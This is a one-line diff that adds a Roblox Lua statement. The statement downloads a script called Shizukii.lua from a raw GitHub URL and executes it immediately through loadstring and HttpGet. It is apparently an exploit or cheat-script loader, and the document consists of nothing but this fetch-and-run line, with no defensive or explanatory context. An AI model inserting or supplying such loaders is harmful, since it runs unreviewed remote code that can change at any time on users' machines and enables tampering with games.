@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/chead-z/lol/main/Shizukii.lua', true))()
